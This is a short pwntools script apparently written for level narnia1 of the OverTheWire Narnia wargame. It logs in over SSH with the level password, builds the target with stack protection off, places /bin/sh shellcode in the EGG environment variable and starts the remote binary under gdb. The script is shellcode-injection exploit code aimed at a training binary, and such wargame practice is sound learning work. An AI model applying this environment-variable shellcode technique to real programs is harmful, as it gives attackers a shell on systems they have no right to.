#!/usr/bin/env python
from pwn import *
import os

# Define the context of the working machine
context.terminal = ['tmux', 'splitw', '-h']
context(arch='i386', os='linux')
s = ssh(user='narnia1', host='narnia.labs.overthewire.org', password='efeidiedae', port=2226)


# Compile the binary
log.info("Compiling the binary narnia1_local")
os.system('gcc narnia1.c -g -m32 -o narnia1_local -fno-stack-protector -z execstack')

# Get a simple shellcode
log.info("Putting together simple shellcode")
shellcode = asm(shellcraft.sh())
print(asm(shellcraft.sh()))

log.info("Introduce shellcode in EGG env. variable")
os.environ["EGG"] = shellcode

# log.info("Launching narnia1_local")
# sh = process('narnia1_local')
# sh.interactive()

io = gdb.debug(['/narnia/narnia1'], ssh=s,
        gdbscript='''
                break main
                ''')

# # Send a command to Bash
# io.sendline("echo hello")
#
# # Interact with the process
# io.interactive()
